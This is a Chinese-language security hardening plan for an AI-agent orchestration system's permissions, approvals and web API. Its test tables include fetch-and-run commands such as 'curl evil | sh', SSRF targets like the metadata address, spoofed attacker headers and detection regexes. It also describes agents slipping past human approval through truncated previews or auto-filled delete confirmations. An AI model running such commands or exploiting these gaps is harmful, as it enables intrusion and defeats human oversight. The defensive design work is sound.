1. **全匹配**：`re.fullmatch(pattern, command)`。这样 `^echo` 只匹配命令精确等于 `echo`；要匹配“echo 加参数”必须写 `^echo(?:\s.*)?$`。
2. **链式命令检测**：

   ```python
   def shell_control_ops(command: str) -> set[str]:
       # shlex with punctuation_chars=True；识别 ; && || | & ( ) < > 换行
       # 以及 $( )、`...`、${...} 之类
   ```

   - `shell.exec` 命中控制符时，风险保持 high（本来就是 high），但**禁止 `always` 泛化**：`_always_scope` 只在 `not shell_control_ops(command)` 时生成规则；否则保留精确 scope。
   - `_is_dangerous` 增补：`;\s*(curl|wget|sh|bash|python)`、`&&\s*(curl|wget)`、`\|` 接解释器、`$(` 等。注意：这不是安全边界，只是风险升级。
3. **legacy 规则隔离**：加载时检查 `command_regex`：
   - 若 pattern 不是 `\A...\Z` / `^...$` 形式，标记 `legacy_unsafe=True`；
   - `_matching` 跳过 `legacy_unsafe` 的 shell 规则（fail closed → 重新审批）；
   - 发 `rule.legacy_disabled` 事件；UI 显示并让用户重写。
4. **`_always_scope` 新语义**：见 D2，建议直接移除“always 自动泛化”；如果保留，生成 `\A(?:ENV\s+)*token(?:\s+[^;&|<>`$()\n]*)?\Z` 并再次检查控制符。
5. 规则创建/更新时编译 regex，失败 → `ValidationError`（400），不落盘。

测试向量：

| command | pattern | 期望 |
|---|---|---|
| `echo hi` | `^echo` | false（fullmatch） |
| `echo hi` | `^echo(?:\s.*)?$` | true |
| `echo hi; curl evil | sh` | `^echo(?:\s.*)?$` | false（链式检查） |
| `sed -n 1p f` | `^sed(?:\s.*)?$` | true（但 always 仅在无链式时） |
| `echo $(curl evil)` | `^echo(?:\s.*)?$` | false（控制符） |

#### 5.4.4 M4 `net.fetch`：私网默认拒绝 + 重定向逐跳

现状：`risk_of` 对私网 `_max_risk(level,"medium")`，base 就是 medium → 空操作；`urlopen` 自动跟随重定向，最终 URL 只检查 scheme。

修复：

1. **默认拒绝私网**：新增 `security.allow_private_network=False`。`ToolExecutor._validate_url`（或 `_prepare`）解析 host：
   - `localhost`/`.local`/`.localhost`、`127.0.0.0/8`、`::1`、`0.0.0.0`、RFC1918、link-local（含 `169.254.169.254` 元数据）、`::ffff:` 映射、`fc00::/7`、`fe80::/10`、保留地址；
   - 若 `allow_private_network=False` → `ToolError("private network is disabled")`，在审批前直接拒绝；
   - 若显式开启 → 仍 `risk=high`。
2. **DNS 解析检查**：`socket.getaddrinfo(host, port)` 的每个 IP 都检查；全部通过才请求；DNS rebinding 的 TOCTOU 残余写进文档（Pi 也承认）。
3. **重定向**：自定义 `HTTPRedirectHandler.redirect_request`：

   ```python
   def redirect_request(self, req, fp, code, msg, headers, newurl):
       if not self._allowed_url(newurl):   # scheme/host/port/私网
           raise ToolError("redirect to disallowed target")
       return super().redirect_request(...)
   ```

   - 只允许 http/https；
   - 逐跳复查私网/凭据/长度；
   - 最多 5 跳。
4. **响应**：保持 2MB cap、15s；校验 `Content-Type`（非 text/html 也可读，但标记）；不发送 Cookie/Authorization/环境凭证（`Request` 默认不带；显式不加）。
5. **风险**：私网 → high；外部 URL → medium。
6. **审批预览**：显示完整 URL + 最终 URL（如果已知）；重定向后的实际目标也写入 tool.result/审计。
7. 测试：用本地 HTTP server 构造 302 到 `127.0.0.1`、`http://[::1]`、`http://169.254.169.254`，断言在第二跳之前拒绝。

#### 5.4.5 M9 `risk()` 的 project_id 路径拼接

现状：

```python
workspace = self.projects_root / str(project_id) / "workspace"
```

若 `project_id="../../.."`，边界被改写，`fs.write /etc/x` 可能被当 medium（仍会 ask，但错误风险/规则匹配）。

修复：

```python
_PROJECT_ID_RE = re.compile(r"^[A-Za-z0-9][A-Za-z0-9._-]{0,63}$")

def project_workspace(projects_root: Path, project_id: str) -> Path:
    pid = str(project_id)
    if not _PROJECT_ID_RE.fullmatch(pid) or pid in (".", ".."):
        raise ValidationError("invalid project id")
    root = Path(projects_root).resolve()
    ws = (root / pid / "workspace").resolve()
    if not is_within(ws, root):
        raise ValidationError("project workspace escapes projects root")
    return ws
```

- `PolicyEngine.risk`、`ApprovalBroker._risk_for`、`App.project_card`、`delete_project`/`_purge_workspace` 全部用这个 helper。
- 项目 id 生成时本来有格式；这里防的是外部输入（RPC/规则/旧数据）。
- 测试：`project_id` 为 `..`、`a/b`、`p-1/../../etc`、`p-1\x00` → 400/拒绝。

#### 5.4.6 M10 once 授权原子性

现状（`b5efb32`）：

- `request()` 在 `policy.evaluate` 返回 allow 后调用 `_spend_one_shot(rule)`（PR #2 已加），所以比本地 `main` 好；
- 但 `evaluate` 与 `consume` 是两次锁，两个并发请求可能都看到 allow，随后一个消费成功、另一个 `_spend_one_shot` 失败 → 转 ask（fail-closed，但原请求可能已执行？不，失败的那个会转 ask；成功者继续）。
- 人工 `once` 的场景：`_spend_once_grant` 在执行前再次 `approval.use`，如果同一 grant 被两个 worker 同时拿到，只有一个成功，另一个 DENY；这是 fail-closed，但用户体验差。

修复（推荐）：

- 引入 `approval.claim(grant_id, fingerprint)`：
  - hub 在锁内校验 grant active、principal、capability、scope fingerprint，扣减 uses，返回 `claim_id`；
  - worker 执行前 claim；claim 失败 → 重新 request/ask；
  - 执行完成 `approval.use(claim_id)` 仅写审计，不再扣减；
  - 这样“决策”和“执行”之间有明确的一次性凭证，不会出现“先消耗、后报 already used”。
- 如果不想加新动作：把 `evaluate + consume` 合并成 `PolicyEngine.evaluate_and_claim(...)` 单锁方法；`ApprovalBroker.request` 调用它；测试并发。

验收：

- [ ] 两个并发 `approval.request` 同一 principal/scope，只有一个拿到 approved/claim，另一个 pending/denied；
- [ ] 不存在“第一个请求执行后，第二个把它消费掉”的顺序；
- [ ] 审计里 `approval.used` 与 `claim_id` 可对应。

---

### 5.5 M6：`project.delete` 的 confirm 不能由 agent 自动填

现状：`ToolExecutor._project_delete` 若 `confirm` 缺失，会先 `project.get` 拿项目名再填入；因此“输入项目名确认”对 agent 形同虚设。

修复：

1. 从所有 worker 角色（lead/assistant/…）移除 `project.delete` 工具；`tools.py` 的 handler 保留给 operator/assistant（本地 main 的 operator 目录），但 operator 路径要求：
   - Web/UI 已认证；
   - 二次确认字段由**人**提供（UI 弹窗输入项目名）；
   - 审计记录 `by`/`auth_subject`。
2. `ToolExecutor._project_delete` 删除“自动填 confirm”分支；没有 confirm → `ToolError`。即使工具被误挂到某个角色，也无法自动完成。
3. `App.delete_project` 保持 `confirm in {name, id}` 校验，并检查 `purge_workspace` 为 bool；`_purge_workspace` 使用 §5.4.5 的 helper，禁止删 `projects_root` 之外的路径。
4. 测试：worker 调 `project.delete` 无 confirm → denied；Web 删除无 confirm → 400；正确 confirm → 删除并审计。

---

## 6. P1 详细方案（健壮性）

### 6.1 L1：Web 输入校验、错误与限额

| 问题 | 修复 |
|---|---|
| `limit`/`priority` 非整数 → 500 | 统一 `_int_query`/`_int_body`：非法 → 400 `BAD_REQUEST`，范围 clamp/拒绝；`priority` 用 `_validate_priority`；`allow_writes`/`purge` 用严格 bool 解析（`"false"` 不是 True）。 |
| `Content-Length: -5` → `readexactly(-5)` ValueError → 500 | 严格 `re.fullmatch(r"\d+", value)`；负数/非法 → 400；`>MAX_BODY` → 413；`Transfer-Encoding: chunked` → 411/501（当前不支持）。 |
| 500 带 `str(exc)` | `WebAPI.handle` 的 generic 分支只返回 `{"code":"INTERNAL","message":"internal server error","request_id":...}`；异常+堆栈写日志；`SfoError` 保留 code/message。 |
| SSE `heartbeat=0` 空转 / 非法值异常 | `float` 解析失败 → 400；范围 `[1,300]`；`since>=0`；`limit∈[1,1000]`；客户端上限。 |
| 路径含 `\x00` → `resolve()` ValueError → 500 | admission 里拒绝 NUL/控制字符 → 400；静态/路由都先校验。 |
| 请求头数量/总大小无上限、慢连接 | `MAX_HEADERS=100`、`MAX_HEADER_BYTES=16KB`、`MAX_REQUEST_LINE=8KB`；超限 431/414；header 读超时 10s、body 30s；`asyncio.start_server(limit=...)` 保持。 |
| 静态路径 | 继续 `resolve + relative_to`；NUL/超长拒绝；符号链接由 resolve 处理（比 DSH 的 lexical containment 更严）。 |
| 方法 | 未允许方法 → 405 + `Allow` 头；`OPTIONS` 不返回 CORS。 |

实现落点：`web/server.py`、`web/api.py`；新增 `tests/test_web_validation.py`。

### 6.2 L2：`project_card` 租约归属

现状：`if card["id"] in json.dumps(l.resource)` → `p-1` 命中 `project:p-10:lead`。

修复：

```python
def _lease_project_id(lease) -> str | None:
    resource = str(getattr(lease, "resource", "") or "")
    if resource.startswith("project:"):
        return resource.split(":", 2)[1]
    meta = getattr(lease, "metadata", None) or {}
    return meta.get("project_id")

card["leases"] = [l.to_dict() for l in leases
                  if _lease_project_id(l) == project_id]
```

测试：p-1/p-10 两个项目、各自租约，断言不串。

### 6.3 S1：project/task update 的 copy-on-write

现状：`ProjectStore.update` 先改 `project.name`，后校验 `status`；`task_update` 先改 `title/description`，后校验 status transition。失败时内存对象已被改，下一次 `save()` 可能把非法状态落盘。

修复：

```python
import copy
candidate = copy.deepcopy(project)
# 所有字段先写 candidate 并校验
...
with self._lock:
    self._projects[project_id] = candidate
self.save()
self._emit(...)
```

- 对 task 同理；`task_update` 的 status transition 用 candidate 校验。
- `save()` 失败时内存保持旧对象；回滚清晰。
- 测试：构造 `{"name":"x","status":"invalid"}`，断言抛错后 `store.get(id).name` 仍是旧值，磁盘也未变。

### 6.4 S2：task deps 校验

- `add_task`：
  - `deps` 必须是 list[str]；
  - 每个 dep 必须在同一 project 且存在；
  - 不能是自身（新建时 id 已知，可检查）；
  - 不能重复；
  - 加环检测（DFS）。
- `task_update` 若 patch 含 `deps`（建议支持），同样校验；删除任务时清理/拒绝悬空依赖（项目删除时整体删除，可忽略）。
- 测试：自引用、未知 id、跨项目 id、A→B→A 环 → `ValidationError`；合法依赖成功。

### 6.5 S3：supervisor 终止升级

现状：`_terminate` 只 `proc.terminate()`，不等待、不升级、不杀进程组。

修复：

- worker 启动 `start_new_session=True`（或 `preexec_fn=os.setsid`）；
- `_terminate`：
  1. `os.killpg(pgid, SIGTERM)`（或 `proc.terminate()` 回退）；
  2. 等待 `proc.wait(timeout=3)`；
  3. 超时 → `os.killpg(pgid, SIGKILL)`；
  4. 再等 `timeout=2`；仍不退 → 记录 `kill_failed`，清理 pid/handle；
  5. 关闭日志文件、释放地址。
- 由于 `supervisor.kill` 是 async，可把 `_terminate` 改成 async 或内部起 `asyncio.to_thread` 等待，避免阻塞事件循环。
- 测试：假进程忽略 SIGTERM（`python -c 'signal.signal(SIGTERM, SIG_IGN); sleep(60)'`），断言 3 秒后被 SIGKILL、无残留。

### 6.6 L3：Rule/Policy 数据健壮性

- `Rule.from_dict` 严格类型：
  - `id/effect/capability/principal/note/source/created_by`：str；
  - `scope`：dict（否则 `{}`）；
  - `risk_max`：合法枚举；
  - `expires_at`：int|None（`bool` 拒绝）；
  - `uses_left`：int|None，>=0；
  - 失败 → 抛 `ValueError`，`load()` 跳过并计数。
- `Rule.active`：`try: int(...)`，异常 → `False`（fail closed）。
- `update_rule`：`Rule.from_dict` 失败 → `ValidationError`（400），不 500；`_validate` 捕获 `TypeError/ValueError/OverflowError`。
- `add_rule`/`update_rule` 编译 `command_regex`/`path_glob`/`url_prefix`，非法 → 400。
- `load()`：无效规则不进 `_rules`，发 `rule.rejected` 事件（带 rule id/原因，不带 secret），UI 显示“N 条规则被隔离”。
- 测试：`uses_left:"x"`、`expires_at:"x"`、`scope=[]`、非法 regex → 启动不崩、规则不生效、update 返回 400。

### 6.7 L4：shell 日志命名与脱敏

- 与 §5.3 合并实现：纳秒+随机、0600、redact、大小上限。
- 日志头 `$ command` 也 redact；`stdout`/`stderr` 文本先 `_redact` 再写；二进制/非 UTF-8 用 `errors="replace"`。
- 测试：同毫秒两次调用 → 文件不同；`echo 'Authorization: Bearer abc'` → 日志里是 `***`。

### 6.8 L5：timeout/数值上限

- `_arg_float`：`math.isfinite`；否则 `ToolError`。
- `_arg_int`：拒绝 `bool`（已有）、非有限 float；`int(value)` 捕获 `OverflowError`。
- `timeout_s`：`min(max(...,0.1), config.shell_max_timeout_s)`；`0/负数` 用默认。
- `wait` 工具的 `seconds` 同样 cap 到 `MAX_WAIT_S=60`（已有，但 NaN 要处理）。
- 测试：`Infinity`/`NaN`/`1e309` → ToolError；`timeout_s=1e9` → 600。

### 6.9 L6：MemoryStore

现状：一个 `memory.json`，每次 `set` 全量重写；无大小限制；损坏时 `read_json` 抛错导致 hub 启动失败。

修复：

- 迁移为 `state/memory/<project_id>.json`（首启从旧 `memory.json` 迁移，成功后备份旧文件）。
- 每个项目大小上限 `security.memory_max_bytes=256KB`（总上限 4MB）；`set` 前计算 `json.dumps` 字节数，超限 → `ValidationError`。
- 原子写（现有 `write_json`）+ 0600。
- 损坏：`read_json` 捕获 → 重命名为 `.corrupt-<ts>`，从空开始，发 `memory.corrupt` 事件；不阻塞 hub。
- 并发：每项目一个锁（或全局 RLock），`set` 原子。
- 测试：损坏文件、超大值、并发 set、迁移。

### 6.10 L7：console 查询

现状：`eventlog.tail(max(limit*4,400))` 后过滤 `project_id`；老项目事件可能完全不在尾部窗口。

修复：`EventLog.query(project_id=None, types=None, limit=...)`：
- 先从内存 deque 倒序扫，满足过滤就收集；
- 不够则从最新的事件文件向前倒序扫描（`iter_jsonl` 的反向需要按行读；可实现 `read_lines_reversed`），直到 limit；
- 上限保护（最多扫 N 条/字节）；`limit` 1..1000。
- `App.console` 调用 `query`；`web.api.console` 同样。
- 测试：造 2000 条事件、项目 A 的只在前 100 条，`console(project=A, limit=10)` 仍能返回。

### 6.11 L8：tcp/web wildcard

- `Config._validate_section`：
  - `web.host` / `transport.host` 若是 `0.0.0.0`、`::`、空、`*`，且 `allow_remote` 不为 True → `ConfigError`；
  - 非 loopback 且无 TLS（web）→ 启动警告/拒绝（按 `web.allow_remote`）。
- `transport.host=0.0.0.0` 时，RPC 监听会暴露；Phase 2 的 v2 auth 提供认证，但默认仍禁止。
- 文档：远程模式需 `--host <具体IP> --trusted-host ... --tls-cert/--tls-key`，或 SSH 隧道。
- 测试：`Config.load` 对 wildcard 抛错；显式允许时通过。

### 6.12 S4/S5：MockBrain 失败处理（不改“开环”设计）

现状：`_coder` 在 `if not self._compiled: self._compiled = True` 之后才返回 shell 动作；runner 执行失败后，下一步仍会登记产物/推进 review。`_reviewer` 的 `fs.read` 失败不会设置 `_missing_artifacts`，下一步仍可能判“通过”。

修复（最小、确定性，不引入“假智能”）：

- `MockBrain` 增加 `observe(action, result)`（runner 已有 `_observe` 调用），保存 `last_tool/last_ok/last_error`。
- `_coder`：
  - 状态 `compile_ok=False`；`shell.exec` 动作发出后，下一次 `next_action` 检查 `last_tool=="shell.exec" and not last_ok` → `_finish("自检失败...", "blocked")`，不再登记产物/推进 review；
  - 只有 `last_ok` 后才置 `_compiled=True`。
- `_reviewer`：
  - `fs.read` 失败（`last_tool=="fs.read" and not last_ok`）→ `_missing_artifacts=True`，写“读取产物失败”并打回 todo；
  - 不把“读失败”当“通过”。
- runner 的 `_track_failure` 已有连续失败/重复失败停止；保留。
- 文档修正：`docs/architecture.md` 的“MockBrain 是开环的”改为“开环规划，但失败会终止/打回，不伪装成功”。
- 测试：mock sys 让 shell 失败/fs.read 失败，断言任务不进入 review/done。

### 6.13 S6：插件 disposer 竞态

现状：`Context.plugin()` 的 `run()` 在 `await plugin(...)` 后才 `child._disposers.append(target)`；如果 `dispose()` 在 await 期间执行，`_disposers` 已清空，晚到的 target 永远不被清理。

修复：

```python
if target is not None:
    if getattr(child, "_disposed", False):
        await _dispose_one(target)   # 立即清理
    else:
        child._disposers.append(target)
        if getattr(child, "_disposed", False):
            # dispose 在本行前后发生：再次检查并清理
            child._disposers.remove(target)
            await _dispose_one(target)
```

- `Context.dispose` 先等待/取消 `handle._task`（带超时），再清 disposers；避免“dispose 完成、run 还在写”。
- `PluginHandle` 记录 `_task`；`dispose` 可 await。
- 测试：慢启动插件（await sleep），启动中 dispose，断言 disposer 被调用一次。

### 6.14 S7：eventlog 订阅者锁

- `subscribe/unsubscribe/close` 与 `_broadcast` 用 `self._lock` 保护列表快照；`put_nowait` 在锁外执行（避免重入）。
- `subscribe` 时如果 `_closed` → 返回一个已关闭/不接收的 queue 或抛 `RuntimeError`；调用方处理。
- 测试：多线程 subscribe/unsubscribe + append，不抛 `RuntimeError: list changed size`。

### 6.15 S8：failure history 上限

- `_history` 改为 `dict[str, deque[float]]` 或每次 tick 调用 `_prune_history(max_window)`：
  - 删除超过 `max(policy.window_s, 3600)` 的时间戳；
  - 空列表删除 key；
  - 字典最多 `2048` 个 work_id（LRU/按最后时间清理）。
- 测试：模拟 10k 次失败 → 内存条目有界；旧 work_id 被清理。

### 6.16 L9：测试路径隔离

- `tests/test_address.py`、`test_transport.py`：`TMP_ROOT = Path(tempfile.gettempdir()) / "sfo-tests"`（或 `SFO_TEST_TMPDIR`），`mkdtemp(prefix="sfo-")`；不再放仓库内。
- 如果路径仍 > `MAX_IPC_PATH_BYTES`，测试里 `skipTest` 并给出清晰原因（而不是 3 个失败）。
- 同步 `docs/architecture.md` §14.10 的说明（“集成测试把 state_dir 放在浅层临时目录”）。
- 这样 CI 在长路径检出下也稳定。

### 6.17 M7/M8：审批预览与脱敏

#### 6.17.1 现状

- `ToolExecutor.max_preview = security.max_preview_chars`（默认 4000）；`_prepare()` 对 `fs.write` 的预览是 `写入 <path>\n---\n<content>`，超出 4000 直接截断；`App._approval_request` 再截一次；审批记录/事件里只剩截断后的内容。恶意内容可以藏在第 4001 个字符之后，审批人看到的“写入”与真实写入不一致。
- `_redact` 的正则是：

  ```python
  r"(?i)\b(api[_-]?key|token|secret|password|credential|authorization)\b"
  r"(\s*[=:]\s*)([^\s,;]+)"
  ```

  对 `Authorization: Bearer abc`，第三组只匹配到 `Bearer`（因为 `[^\s,;]+` 遇到空格停止），替换后是 `Authorization: *** abc`——**token 仍然泄露**。`Cookie:`、`X-Api-Key:`、URL userinfo、JWT、`ghp_` 等也没有覆盖。

#### 6.17.2 预览数据模型

在 `ApprovalRequest` 增加：

```python
preview_full: str = ""          # 脱敏后的完整预览，最多 preview_store_chars
preview_sha256: str = ""        # 对 preview_full 的 sha256
preview_truncated: bool = False # 原始内容是否被截断
preview_bytes: int = 0          # 原始内容字节数
```

- `security.preview_store_chars` 默认 `65536`（64KB），上限 `262144`；`max_preview_chars` 仍作为 UI 默认展示长度。
- `ToolExecutor._prepare()` 返回 `preview_full` + `preview`（展示用截断）+ 哈希/字节数；`_approval_request` 只做长度上限与二次 redact，不再无脑截断到 4000。
- 事件日志只存 `preview`（截断）+ `preview_sha256` + `preview_truncated`；完整 `preview_full` 存在 `approvals.json`（有界），UI 通过 `GET /api/approvals/{id}`（已认证）按需查看。
- `fs.write` 预览额外包含：
  - `path`、`bytes`、`sha256(content)`；
  - 前 N 行/后 N 行（N=20），中间明确写 `…（已省略 X 行/Y 字节）…`；
  - 若目标文件已存在，显示 `new`/`overwrite` 与旧文件大小；可选 diff（Phase 4 体验）。
- `shell.exec` 预览包含完整命令（redact 后）、cwd、链式操作符列表、风险原因；命令本身不应被截断到看不见关键参数。
- `net.fetch` 预览包含原始 URL、规范化后的 scheme/host/port/path、是否私网、最终 URL（若已知）。
- UI：审批卡片显示“截断/完整”徽标；点击“查看完整内容”打开详情；内容用 `textContent` 渲染，不用 `innerHTML`；CSP 已禁止 inline script。

> 预览不是“安全边界”，审批人仍可能不看；但“看到的和实际执行的不一致”是必须消除的缺陷。DSH 的审批审计只有 reason、没有完整输入；Pi 的敏感动作说明只截 512 字符。StackFlowOS 采用“完整预览有界保存 + 展示截断 + 哈希”的组合，优于两者。

#### 6.17.3 脱敏规则

```python
_AUTH_HEADER = re.compile(r"(?i)\b(authorization|proxy-authorization|cookie|set-cookie)\s*[:=]\s*[^\r\n]+")
_BEARER = re.compile(r"(?i)\bbearer\s+[A-Za-z0-9._~+/=-]{8,}")
_SECRET_PAIR = re.compile(
    r"(?i)\b(api[_-]?key|access[_-]?key|secret|token|password|passwd|credential)\b"
    r"\s*[:=]\s*[\"']?([^\s\"',;]{3,})")
_USERINFO = re.compile(r"(?i)\b([a-z][a-z0-9+.-]*://)[^/\s:@]+:[^/\s@]+@")
_JWT = re.compile(r"\beyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}")
_GITHUB = re.compile(r"\b(gh[pousr]_[A-Za-z0-9]{20,}|github_pat_[A-Za-z0-9_]{20,})")
_NPM = re.compile(r"\bnpm_[A-Za-z0-9]{20,}")
```

顺序：

1. 先替换整行 `Authorization`/`Cookie`（避免只遮住 `Bearer`）；
2. `Bearer <token>` → `Bearer ***`；
3. `key=value` 对 → 保留 key，值 `***`；
4. URL userinfo → `scheme://***@host`；
5. JWT/`ghp_`/`npm_` → `***`。

注意：

- 不要对二进制 `stdout` 做强转；`errors="replace"` 后 redact。
- `_safe_args` 里 `content/value/patch` 当前被整体丢弃；保留“显示摘要”而不是完全隐藏（否则审批人看不到写入内容）。改为：`content` 显示 `bytes/sha256/前 N 行`，不显示原文；`patch` 显示 redact 后的 JSON（有界）。
- 环境变量/日志同样走这套 redact（§5.3 的 shell 日志）。

#### 6.17.4 测试

| # | 输入 | 期望 |
|---|---|---|
| 1 | `Authorization: Bearer abcdefgh` | `Authorization: ***`，不残留 `abcdefgh` |
| 2 | `Bearer abcdefgh` | `Bearer ***` |
| 3 | `api_key=sk-123456` | `api_key=***` |
| 4 | `https://user:pass@example.com/x` | `https://***@example.com/x` |
| 5 | `ghp_` + 36 字符 | `***` |
| 6 | `Cookie: session=abc` | `Cookie: ***` |
| 7 | fs.write 内容 100KB | `preview_truncated=true`，`preview_full` 64KB，`sha256` 对应全文 |
| 8 | fs.write 内容 1KB | `preview_full` 完整、`preview_truncated=false` |
| 9 | 事件日志 | 不含 `preview_full`，只含截断+哈希 |

新增 `tests/test_preview_redact.py`（或并入 `tests/test_agent_tools.py`）。

---

## 7. P2 / 后续路线

### 7.1 OS 沙箱（Phase 5，真正的执行边界）

- 引入 `security.sandbox_mode`：`read-only` / `workspace-write` / `danger-full-access`（DSH 的三档）。
- Linux 优先 Landlock（无特权），失败回退 bwrap；都不可用 → **拒绝执行**（不静默降级）。
- 网络：默认 `--unshare-net`（bwrap）或 seccomp/防火墙；`net.fetch` 仍走工具层。
- 文件：`workspace` 只读/读写；`/tmp` 私有；拒绝符号链接根；写路径用“检查后返回新 target”（DSH 的 `checkedTarget` 语义）。
- 独立用户/系统用户运行 worker（`sfo-worker`），hub 通过 IPC 权限控制；这是解决“同用户 agent 读 token”的根本方案。
- MCP 工具：独立 allowlist + 审批；MCP stdio env scrub + 诊断 redact（DSH 的做法）。
- 文档：README“边界与已知限制”更新；不再写“worker 可信”，改为“worker 权限受限，代码执行在 Phase 5 由 OS 沙箱约束”。

### 7.2 远程模式

- `sfo hub --host <具体IP> --trusted-host <authority> --tls-cert/--tls-key`；代码层拒绝 wildcard。
- Web：`Secure` Cookie 仅当 TLS；`trusted_hosts` 精确匹配；非 loopback 明文 HTTP 启动警告/拒绝。
- RPC：v2 auth + 每设备 token/证书；`transport.allow_remote=true` 才允许非 loopback。
- 文档：SSH 隧道/反代优先；不要让 `publicUrl` 参与授权（DSH 的教训）。

### 7.3 审批体验

- 审批详情页：完整 preview（64KB）、diff（fs.write）、命令解释（shell）、风险原因、来源 agent/项目/任务、历史同类规则。
- 一键“只允许这一次”（默认）、“本会话允许”、“去设置页创建规则”；不再从弹窗直接生成泛化规则。
- 规则编辑器：显式字段 + 预览匹配示例 + “这条规则会匹配/不会匹配”测试按钮。
- 审计页：按 principal/项目/能力过滤；显示 claim/use 对应关系。

### 7.4 其他

- 速率限制：认证失败（每 IP/每 token）、审批 decide、SSE 连接、shell 并发。
- 事件单条大小上限（64KB）、会话/记忆/日志的保留策略。
- 依赖/供应链：pynng 版本锁定；pip 哈希；CI 安全扫描。
- 前端：Subresource Integrity（无 CDN，暂不需要）、Trusted Types（可选）。

---

## 8. 测试计划

### 8.1 新增/修改测试文件

| 文件 | 覆盖 |
|---|---|
| `tests/test_web_security.py` | token/cookie/admission/CSRF/DNS rebinding/clickjacking/SSE/headers/401/403/415/405 |
| `tests/test_web_validation.py` | limit/priority/CL/header/NUL/heartbeat/500 脱敏/慢连接 |
| `tests/test_rpc_authz.py` | v2 auth、principal 绑定、动作白名单、跨项目、event/lease/approval、缓存 key |
| `tests/test_event_trust.py` | 外部 PUB 不能写事件；event.append 类型/source/project 强制 |
| `tests/test_policy_matchers.py` | url_prefix/path_glob/command_regex/SR 向量/legacy 隔离 |
| `tests/test_net_fetch.py` | 私网拒绝、重定向逐跳、DNS 解析、风险 high |
| `tests/test_shell_exec.py` | 进程组 kill、孙子进程持管道、输出 cap、NaN/Inf、日志唯一/0600/redact/env allowlist |
| `tests/test_approval_once.py` | 并发 once、claim/use、owner 校验 |
| `tests/test_preview_redact.py` | 完整预览/截断/哈希、Authorization/Bearer/JWT/userinfo/gh token 脱敏 |
| `tests/test_robustness.py` | store copy-on-write、deps、policy 损坏、memory 损坏/上限、console、project_card、failure history、disposer |
| `tests/test_supervisor_kill.py` | TERM→KILL 升级、无残留 |
| 修改 `tests/test_address.py`/`test_transport.py` | 临时目录改 `/tmp`，长路径 skip |
| 修改 `tests/test_web.py`/`test_security.py`/`test_agent_tools.py` | 适配新的认证/动作表/预览字段 |

### 8.2 关键测试矩阵（节选）

**Web CSRF/认证**

| # | 请求 | 期望 |
|---|---|---|
| 1 | 无凭证 `GET /api/state` | 401 |
| 2 | `POST /api/approvals/x/decide`，`text/plain`，合法 JSON body，无凭证 | 401（认证先于解析） |
| 3 | 有 Cookie，`Origin: https://evil.example` | 403 |
| 4 | 有 Cookie，`Host: evil.example:17800` | 403 |
| 5 | 有 Cookie，`Sec-Fetch-Site: cross-site` | 403 |
| 6 | 有 Cookie，`application/json`，无 `X-SFO-Request` | 403 |
| 7 | 有 Cookie，`application/json`，同源，`X-SFO-Request: 1` | 200 |
| 8 | `OPTIONS /api/state` | 405，无 ACAO |
| 9 | `GET /api/events/stream` 无凭证 | 401，无 ACAO |
| 10 | 错误 `?token=` | 401；正确 → 303 + HttpOnly/SameSite=Strict |
| 11 | 静态 HTML | 含 CSP/XFO/nosniff |
| 12 | `GET /?token=a&token=b` | 400/401（只允许一个） |

**RPC 授权**

| # | 调用者 | 动作 | 期望 |
|---|---|---|---|
| 1 | 无 token | 任意 | 401 |
| 2 | unit A | `project.delete` | 403 |
| 3 | unit A | `task.update`（B 项目 task） | 403 |
| 4 | unit A | `agent.kill`（B 项目 agent） | 403 |
| 5 | unit A | `event.append type=approval.decided` | 403 |
| 6 | unit A | `lease.release`（B 的 lease） | 403 |
| 7 | unit A | `unit.release work_id=B` | 403 |
| 8 | unit A | `approval.request principal=B` | 403 |
| 9 | unit A | `approval.decide` | 403 |
| 10 | unit A | `task.update`（自己项目） | 200 |
| 11 | lead | `agent.kill`（同项目 worker） | 200 |
| 12 | operator/web | `approval.decide` | 200 |

**策略向量**

| # | 输入 | 期望 |
|---|---|---|
| 1 | `https://api.example.com.evil.io` vs `https://api.example.com` | false |
| 2 | `/ws/proj/../../etc/passwd` vs `/ws/proj/*` | false |
| 3 | `echo hi; curl evil|sh` vs `^echo(?:\s.*)?$` | false |
| 4 | `http://127.0.0.1:17800/api/state` | 拒绝/高风险 |
| 5 | `302 → http://127.0.0.1` | 在第二跳前拒绝 |
| 6 | `project_id=../../..` | 400 |
| 7 | once 并发 2 个 | 恰好 1 个 approved |

**shell**

| # | 命令 | 期望 |
|---|---|---|
| 1 | `python3 -c 'import subprocess; subprocess.Popen(["sleep","30"]); print("x")'` | timeout 后 3s 内返回，无 sleep |
| 2 | `sh -c 'sleep 30 & echo hi'` | 不挂死 |
| 3 | 100MB 输出 | 内存有界，truncated |
| 4 | `timeout_s=inf/nan` | ToolError |
| 5 | 同毫秒两次 | 日志文件不同 |
| 6 | `echo 'Authorization: Bearer x'` | 日志 redact |

### 8.3 测试实现要点

- Web 测试用 `asyncio.start_server` 启真实 `WebServer`，用 `http.client.HTTPConnection` 构造原始请求（便于设置 Host/Origin/Content-Type/CL）；不要只测 handler。
- Cookie 测试用 `http.cookiejar` 或手动 `Cookie` 头；断言 `Set-Cookie` 含 `HttpOnly`/`SameSite=Strict`。
- DNS rebinding 测试不需要真 DNS：直接设置 `Host` 头为 attacker，断言 403。
- shell 进程组测试：Linux 下用 `ps`/`/proc` 断言 `sleep` 不存在；非 Linux skip。
- 并发 once：`asyncio.gather` 两个 `approval.request`，断言只有一个 `approved` 且 `grant_id` 只被消费一次。
- 策略测试纯函数化：把 `_match_key` 抽成可单测的辅助函数（或直接构造 `Rule` + `scope`）。
- 事件 PUB 测试：用 pynng PUB 连 `sys.0.events.sock` 发伪造事件，断言 `eventlog.last_seq` 不变/事件被拒。
- 性能：SSE 慢消费者、1000 条事件过滤、100 条规则匹配，避免退化。

---

## 9. 实施计划

### 9.1 阶段与提交

依赖关系：**H1 → X1**（Web 认证先于 operator 链）；**H3 → M5/M6/X2**（principal 模型先于范围校验/事件信任）；**M1–M3 与 D2 规则策略一起发布**（新 matcher 与旧的 always 泛化同时改，避免“规则更严但仍在自动泛化”）；M4/M9 与 H4 可独立并行；L*/S* 可在 Phase 4 并行。

| 阶段 | 内容 | 产出/提交 | 退出标准 | 估算 |
|---|---|---|---|---|
| Phase 0 | 合并基线、修测试路径、加红测试 | `test: isolate ipc temp dirs`；`test(security): add failing regression tests` | 261/285 基线全绿；新测试按预期失败 | 1–2 天 |
